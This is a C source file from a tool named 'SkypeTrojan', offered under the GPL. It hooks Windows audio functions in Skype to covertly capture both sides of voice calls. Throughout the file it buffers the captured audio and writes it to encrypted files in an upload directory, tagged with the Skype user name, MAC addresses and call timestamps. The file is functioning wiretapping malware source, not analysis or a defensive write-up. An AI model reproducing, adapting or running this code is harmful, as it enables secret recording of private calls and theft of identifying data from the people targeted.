/*
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <http://www.gnu.org/licenses/>.
 */



/*
 * Tool name   : SkypeTrojan
 * Description : Tool to intercept Skype API calls and to extract voice data.
 *               The extracted data will be converted to MP3 and encrypted.
 * Version     : 
 * Author      : Ruben Unteregger
 * Web page    : http://www.megapanzer.com
 * Todo        : 
 * Changes     : 
 *
 */






#include <windows.h>
#include <stdio.h>

#include <time.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <Lm.h>

#include <Shlwapi.h>
#include "VoIP_Recorder.h"
#include "Skype_2_Functions.h"
#include "BladeMP3EncDLL.h"
#include "crypto.h"



MYWAVEINOPEN fwaveInOpen;
MYWAVEINCLOSE fwaveInClose;
MYWAVEOUTOPEN fwaveOutOpen;
MYWAVEOUTCLOSE fwaveOutClose;

extern byte* CG_waveInOpen;
extern byte* CG_waveInClose;
extern byte* CG_waveOutOpen;
extern byte* CG_waveOutClose;

void (CALLBACK *gOriginalWaveInCallback)(HWAVEIN hwo, UINT pMsg, DWORD dwInstance, DWORD dwParam1, DWORD dwParam2);
void (CALLBACK *gOriginalWaveOutCallback)(HWAVEOUT hwo, UINT pMsg, DWORD dwInstance, DWORD dwParam1, DWORD dwParam2);


extern char gInAudioBlocksBuffer[MAX_AUDIO_SIZE];
extern char gOutAudioBlocksBuffer[MAX_AUDIO_SIZE];

extern int gOutAudioBlocksBufferSize;
extern int gInAudioBlocksBufferSize;

extern char gHomeDirectory[MAX_BUF_SIZE + 1];
extern char *gLIID;
extern char *gHiddenDirectory;
extern char *gQuality;

extern int gVoIPVersionApplication;
extern int gCurrentCallID;

int gBlockCounterInput = 0;
int gBlockCounterOutput = 0;



extern char gInTimeStamp[MAX_BUF_SIZE + 1];
SYSTEMTIME gSystemTime;

time_t gStartTime;
time_t gStopTime;


DWORD gSequenceNumberInput = 1;
DWORD gSequenceNumberOutput = 1;
DWORD gInputStatus = CHANNEL_CLOSED;
DWORD gInputOpenCounter = 0;
DWORD gOutputOpenCounter = 0;




/*
 * waveInClose
 *
 */

MMRESULT WINAPI MywaveInClose(HWAVEIN hwi)
{
  FILE *mFH = NULL;
  MYWAVEINCLOSE fwaveInClose = (MYWAVEINCLOSE) CG_waveInClose;
  DWORD dwWritten = 0;
  sAudioData *mAudioDataInput; 
  sAudioData *mAudioDataOutput;
  char mCallIDPattern[MAX_BUF_SIZE + 1];
  char mVoiceDirectory[MAX_BUF_SIZE + 1];
  char mMP3FileName[MAX_BUF_SIZE + 1];
  char mMACAddresses[MAX_BUF_SIZE + 1];
  char mCurrentUserName[MAX_BUF_SIZE + 1];
  int mRetVal = 0;
  char mHeaderData[MAX_BUF_SIZE];
  char mTemp[MAX_BUF_SIZE * 2];
  char mTemp2[MAX_BUF_SIZE];
  char *mEncodedAndEncrypted = NULL;
  int mOutputLength = 0;



  if(!fwaveInClose)
    return 0; //if function pointer is invalid...


  if (gVoIPVersionApplication == SKYPE_2)
  {
    gInputStatus = CHANNEL_CLOSED;



    /*
     * Write audio input blocks to buffer
     *
     */

    if (gInAudioBlocksBufferSize > 0)
    {
      if ((mAudioDataInput = (sAudioData *) HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(sAudioData))) != NULL)
      {
        if (gInAudioBlocksBufferSize > gOutAudioBlocksBufferSize)
          gInAudioBlocksBufferSize = gOutAudioBlocksBufferSize;

        if ((mAudioDataInput->mAudioDataBuffer = (short *) HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, gInAudioBlocksBufferSize)) != NULL)
        {
          mAudioDataInput->mAudioDataSize = gInAudioBlocksBufferSize;
          mAudioDataInput->mPacketNumber = gBlockCounterInput;
          mAudioDataInput->mHangUp = 0;
          memcpy(mAudioDataInput->mAudioDataBuffer, gInAudioBlocksBuffer, gInAudioBlocksBufferSize);
          gInAudioBlocksBufferSize = 0;
          ZeroMemory(gInAudioBlocksBuffer, MAX_AUDIO_SIZE);
          writeInputThread(mAudioDataInput);
          gBlockCounterInput++;
        } // if (mAudioDataInput->mAudioDataBuffer != NULL)
      } // if (mAudioDataInput != NULL)
    } // if (gInAudioBlocksBufferSize > 0)



    /*
     * Write audio output blocks to buffer
     *
     */

    if (gOutAudioBlocksBufferSize > 0)
    {
      mAudioDataOutput = (sAudioData *) HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(sAudioData));
      if (mAudioDataOutput != NULL)
      {	  
        if ((mAudioDataOutput->mAudioDataBuffer = (short *) HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, gOutAudioBlocksBufferSize)) != NULL)
        {
          mAudioDataOutput->mPacketNumber = gBlockCounterOutput;
          mAudioDataOutput->mAudioDataSize = gOutAudioBlocksBufferSize;
          mAudioDataOutput->mHangUp = 0;

          memcpy(mAudioDataOutput->mAudioDataBuffer, gOutAudioBlocksBuffer, gOutAudioBlocksBufferSize);
          gOutAudioBlocksBufferSize = 0;
          ZeroMemory(gOutAudioBlocksBuffer, MAX_AUDIO_SIZE);
          writeOutputThread(mAudioDataOutput);
          gBlockCounterOutput++;
        } // if (mAudioDataOutput->mAudioDataBuffer != NULL)
      } // if (mAudioDataOutput != NULL)
    } // if (gOutAudioBlocksBufferSize > 0)


    /*
     * Create Input-UPLOADED files, if any datablocks for the current call id exist
     *
     */

    ZeroMemory(mVoiceDirectory, sizeof(mVoiceDirectory));
    strncpy(mVoiceDirectory, gHomeDirectory, sizeof(mVoiceDirectory) - 1);
    if (mVoiceDirectory[strlen(mVoiceDirectory) - 1] != '\\')
      strcat(mVoiceDirectory, "\\");  

    strcat(mVoiceDirectory, UPLOAD_DIRECTORY);

    if (gBlockCounterOutput > 0)
    {
      /*
       * check if UPLOADED file already exists. if so, dont create it a second time
       *
       */

      ZeroMemory(mCallIDPattern, sizeof(mCallIDPattern));
      snprintf(mCallIDPattern, sizeof(mCallIDPattern) - 1, "A%04d*UI.bin", gCurrentCallID);

      if (voiceDataAvailable(mVoiceDirectory, mCallIDPattern) != 0)
      {  
        // the output filename on the target system
        ZeroMemory(mMP3FileName, sizeof(mMP3FileName)); 
        snprintf(mMP3FileName, MAX_BUF_SIZE, "%sA%04d%04dUI.bin", mVoiceDirectory, gCurrentCallID, gBlockCounterInput);

        // get skype user name
        ZeroMemory(mCurrentUserName, sizeof(mCurrentUserName));
        mRetVal = getActiveUser(mCurrentUserName, sizeof(mCurrentUserName) - 1);

        // get all mac addresses
        ZeroMemory(mMACAddresses, sizeof(mMACAddresses));
        getMACAddress(mMACAddresses, sizeof(mMACAddresses));


        ZeroMemory(mTemp, sizeof(mTemp));
        ZeroMemory(mTemp2, sizeof(mTemp2));

        if (mRetVal == 0)
        {
          time(&gStopTime);
          snprintf(mTemp2, sizeof(mTemp2) - 1, "%d,%d,%s,%s", gStartTime, gStopTime, mCurrentUserName, mMACAddresses);
        } else
          snprintf(mTemp2, sizeof(mTemp2) - 1, "#UNKNOWN#");

 

        /*
         * The output filename in the header part of the output file
         *
         */

        ZeroMemory(mHeaderData, sizeof(mHeaderData)); 
        snprintf(mHeaderData, sizeof(mHeaderData) - 1, "%s,%04d-%04d-SkypeIn-%s.mp3,%d", VR_BANNER, gCurrentCallID, gBlockCounterInput, SIGN_UPLOADED, strlen(mTemp2));
        memcpy(mTemp, mHeaderData, sizeof(mHeaderData));


        memcpy(&mTemp[sizeof(mHeaderData)], mTemp2, strlen(mTemp2));
        mEncodedAndEncrypted = encryptAndEncode(sizeof(mHeaderData) + strlen(mTemp2), mTemp, &mOutputLength, gLIID);
        writeDataToFile(mMP3FileName, mEncodedAndEncrypted, mOutputLength);


        if (mEncodedAndEncrypted != NULL)
        {
          HeapFree(GetProcessHeap(), 0, mEncodedAndEncrypted);
          mEncodedAndEncrypted = NULL;
        } // if (mEncodedAndEncrypted != NULL)
      } // if (voiceDataAvailable(mVoiceDirectory, mCallIDPattern) != 0)
    } // if (gBlockCounterOutput > 0)




    /*
     * Create Output-UPLOADED files, if any datablocks for the current call id exist
     *
     */

    if (gBlockCounterInput > 0)
    {

      /*
       * Check if UPLOADED file already exists. if so, dont create it a second time
       *
       */

      ZeroMemory(mCallIDPattern, sizeof(mCallIDPattern));
      snprintf(mCallIDPattern, sizeof(mCallIDPattern) - 1, "A%04d*UO.bin", gCurrentCallID);

      if (voiceDataAvailable(mVoiceDirectory, mCallIDPattern) != 0)
      {
        // the output filename
        ZeroMemory(mMP3FileName, sizeof(mMP3FileName));
        snprintf(mMP3FileName, MAX_BUF_SIZE, "%sA%04d%04dUO.bin", mVoiceDirectory, gCurrentCallID, gBlockCounterOutput);

        // get skype user name
        ZeroMemory(mCurrentUserName, sizeof(mCurrentUserName));
        mRetVal = getActiveUser(mCurrentUserName, sizeof(mCurrentUserName) - 1);
      
        // get all mac addresses
        ZeroMemory(mMACAddresses, sizeof(mMACAddresses));
        getMACAddress(mMACAddresses, sizeof(mMACAddresses));

        ZeroMemory(mTemp, sizeof(mTemp));
        ZeroMemory(mTemp2, sizeof(mTemp2));
		
        if (mRetVal == 0)
        {
          time(&gStopTime);
          snprintf(mTemp2, sizeof(mTemp2) - 1, "%d,%d,%s,%s", gStartTime, gStopTime, mCurrentUserName, mMACAddresses);
        } else
          snprintf(mTemp2, sizeof(mTemp2) - 1, "#UNKNOWN#");



        /*
         * The output filename in the header part of the output file
         *
         */

        ZeroMemory(mHeaderData, sizeof(mHeaderData)); 
        snprintf(mHeaderData, MAX_BUF_SIZE - 1, "%s,%04d-%04d-SkypeOut-%s.mp3,%d", VR_BANNER, gCurrentCallID, gBlockCounterOutput, SIGN_UPLOADED, strlen(mTemp2));
        memcpy(mTemp, mHeaderData, sizeof(mHeaderData));

		
        memcpy(&mTemp[sizeof(mHeaderData)], mTemp2, strlen(mTemp2));
        mEncodedAndEncrypted = encryptAndEncode(sizeof(mHeaderData) + strlen(mTemp2), mTemp, &mOutputLength, gLIID);
        writeDataToFile(mMP3FileName, mEncodedAndEncrypted, mOutputLength);


        if (mEncodedAndEncrypted != NULL)
        {
          HeapFree(GetProcessHeap(), 0, mEncodedAndEncrypted);
          mEncodedAndEncrypted = NULL;
        } // if (mEncodedAndEncrypted != NULL)
      } // if (voiceDataAvailable(mVoiceDirectory, mCallIDPattern) != 0)
    } // if (gBlockCounterInput > 0)


    /*
     * Delete any marker files and initialise counters
     *
     */

    deleteAnyRecordingFlag(RECORDING_OUTPUT_SIGN_FILE, "MywaveInClose");
    deleteAnyRecordingFlag(RECORDING_INPUT_SIGN_FILE, "MywaveInClose");


    gBlockCounterInput = 0;
    gBlockCounterOutput = 0;
  } // if (gVoIPVersionApplication == SKYPE_2)


  return(fwaveInClose(hwi));
}




/*
 * WaveOutClose
 *
 */

MMRESULT WINAPI MywaveOutClose(HWAVEOUT hwo)
{
  MMRESULT ret = 0;
  MYWAVEOUTCLOSE fwaveOutClose = (MYWAVEOUTCLOSE) CG_waveOutClose;
  DWORD dwWritten = 0;


  if(!fwaveOutClose)
    return 0; //if function pointer is invalid...

  /*
   * Close open file handle
   *
   */

  return(fwaveOutClose(hwo));
}



/*
 *
 *
 */

void CALLBACK waveInCallback(HWAVEIN hwo, UINT pMsg, DWORD dwInstance, DWORD dwParam1, DWORD dwParam2)
{
  DWORD mThreadID = 0;
  WAVEHDR *pwh;
  sAudioData *mAudioData;

  if (gVoIPVersionApplication == SKYPE_2)
  {  
    if (gInputStatus == CHANNEL_OPEN && pMsg == WIM_DATA)
    {
      pwh = (WAVEHDR *)dwParam1;

      /*
       * Write input audio blocks to file
       *
       */

      if (gInAudioBlocksBufferSize + pwh->dwBufferLength >= MAX_AUDIO_SIZE)
      {
        /*
         * Write audio blocks to buffer
         *
         */

        if ((mAudioData = (sAudioData *) HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(sAudioData))) != NULL)
        { 
          if ((mAudioData->mAudioDataBuffer = (short *) HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, gInAudioBlocksBufferSize)) != NULL)
          {
            mAudioData->mPacketNumber = gBlockCounterInput;
            mAudioData->mAudioDataSize = gInAudioBlocksBufferSize;
            mAudioData->mHangUp = 1;
            memcpy(mAudioData->mAudioDataBuffer, gInAudioBlocksBuffer, gInAudioBlocksBufferSize);
            CreateThread(0, 0, writeInputThread, mAudioData, 0, &mThreadID);
            gBlockCounterInput++;
          }
        }



        /*
         * Add first data block to buffer
         *
         */

        ZeroMemory(gInAudioBlocksBuffer, MAX_AUDIO_SIZE); 
        memcpy(gInAudioBlocksBuffer, pwh->lpData , pwh->dwBufferLength);
        gInAudioBlocksBufferSize = pwh->dwBufferLength;
      } else {
        memcpy((gInAudioBlocksBuffer + gInAudioBlocksBufferSize), pwh->lpData , pwh->dwBufferLength);
        gInAudioBlocksBufferSize += pwh->dwBufferLength;
      } // if (gInAudioBlocksBufferSize + pwh->dwBufferLength >= MAX_AUDIO_SIZE)
    } // if (gInputStatus == CHANNEL_OPEN && pMsg == WIM_DATA)
  } // if (gVoIPVersionApplication == SKYPE_2)

  (*gOriginalWaveInCallback)(hwo, pMsg, dwInstance, dwParam1, dwParam2);
}



/*
 * WaveInOpen()
 *
 */

MMRESULT WINAPI MywaveInOpen(LPHWAVEIN phwi, UINT_PTR uDeviceID, LPWAVEFORMATEX pwfx, DWORD_PTR dwCallback, DWORD_PTR dwCallbackInstance, DWORD fdwOpen)
{
  MYWAVEINOPEN fwaveInOpen = (MYWAVEINOPEN) CG_waveInOpen;


  if(!fwaveInOpen)
    return 0; //if function pointer is invalid...


  if (gVoIPVersionApplication == SKYPE_2)
  {
    gInputStatus = CHANNEL_OPEN;

    setRecordingMarker(RECORDING_INPUT_SIGN_FILE);
    setRecordingMarker(RECORDING_OUTPUT_SIGN_FILE);

    gInAudioBlocksBufferSize = 0;
    ZeroMemory(gInAudioBlocksBuffer, MAX_AUDIO_SIZE);

    gOutAudioBlocksBufferSize = 0;
    ZeroMemory(gOutAudioBlocksBuffer, MAX_AUDIO_SIZE);

    gCurrentCallID = getCurrentCallID();


    /*
     * Intercept callback function
     *
     */

    if (fdwOpen == CALLBACK_FUNCTION)
      gOriginalWaveInCallback = (ORIGINALWAVEINCALLBACK) dwCallback;




    /*
     * Create timestamp & output file
     *
     */

    ZeroMemory(gInTimeStamp, sizeof(gInTimeStamp));
    ZeroMemory(&gSystemTime, sizeof(gSystemTime));

    GetLocalTime(&gSystemTime);
    snprintf(gInTimeStamp, MAX_BUF_SIZE, "%04d-%02d-%02d-%02d-%02d-%02d", gSystemTime.wYear, gSystemTime.wMonth, gSystemTime.wDay, gSystemTime.wHour, gSystemTime.wMinute, gSystemTime.wSecond);
    time(&gStartTime);
  } // if (gVoIPVersionApplication == SKYPE_2)

  return(fwaveInOpen(phwi, uDeviceID, pwfx, (unsigned long *) waveInCallback, dwCallbackInstance, fdwOpen));
}




/*
 *
 *
 */

void CALLBACK waveOutCallback(HWAVEOUT hwo, UINT pMsg, DWORD dwInstance, DWORD dwParam1, DWORD dwParam2)
{
  DWORD mThreadID = 0;
  WAVEHDR *pwh;
  sAudioData *mAudioData = NULL;


  if (gVoIPVersionApplication == SKYPE_2)
  {
    if (gInputStatus == CHANNEL_OPEN && pMsg == WOM_DONE)
    {
      pwh = (WAVEHDR *)dwParam1;

      /*
       * Write input audio blocks to file
       *
       */

      if (gOutAudioBlocksBufferSize + pwh->dwBufferLength >= MAX_AUDIO_SIZE)
      {
        /*
         * Write audio blocks to buffer
         *
         */

        if ((mAudioData = (sAudioData *) HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(sAudioData))) != NULL)
        {        
          if ((mAudioData->mAudioDataBuffer = (short *) HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, gOutAudioBlocksBufferSize)) != NULL)
          {
            mAudioData->mPacketNumber = gBlockCounterOutput;
            mAudioData->mAudioDataSize = gOutAudioBlocksBufferSize;
            mAudioData->mHangUp = 1;

            memcpy(mAudioData->mAudioDataBuffer, gOutAudioBlocksBuffer, gOutAudioBlocksBufferSize);
            CreateThread(0, 0, writeOutputThread, mAudioData, 0, &mThreadID);
            gBlockCounterOutput++;
          }
        }

        // add first data block to buffer
        ZeroMemory(gOutAudioBlocksBuffer, MAX_AUDIO_SIZE); 
        memcpy(gOutAudioBlocksBuffer, pwh->lpData, pwh->dwBufferLength);
        gOutAudioBlocksBufferSize = pwh->dwBufferLength;
      } else {
        memcpy((gOutAudioBlocksBuffer + gOutAudioBlocksBufferSize), pwh->lpData , pwh->dwBufferLength);
        gOutAudioBlocksBufferSize += pwh->dwBufferLength;
      }
    } // if (gInputStatus == CHANNEL_OPEN && pMsg == WOM_DONE)
  } // if (gVoIPVersionApplication == SKYPE_2)

  (*gOriginalWaveOutCallback)(hwo, pMsg, dwInstance, dwParam1, dwParam2);
}




/*
 * WaveOutOpen()
 *
 */

MMRESULT WINAPI MywaveOutOpen(LPHWAVEOUT phwo, UINT_PTR uDeviceID, LPWAVEFORMATEX pwfx, DWORD_PTR dwCallback, DWORD_PTR dwCallbackInstance, DWORD fdwOpen)
{
  MYWAVEOUTOPEN fwaveOutOpen = (MYWAVEOUTOPEN) CG_waveOutOpen;


  if(!fwaveOutOpen)
    return 0; //if function pointer is invalid...

  /*
   * Intercept callback function
   *
   */

  if (gVoIPVersionApplication == SKYPE_2)
    if (fdwOpen == CALLBACK_FUNCTION)
      gOriginalWaveOutCallback = (ORIGINALWAVEOUTCALLBACK) dwCallback;


  return(fwaveOutOpen(phwo, uDeviceID, pwfx, (unsigned long *) waveOutCallback, dwCallbackInstance, fdwOpen));
}

